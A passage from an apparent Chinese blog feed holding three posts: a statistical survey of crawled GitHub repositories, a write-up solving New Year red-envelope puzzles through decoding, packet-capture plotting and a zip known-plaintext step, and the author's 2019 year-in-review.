CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" 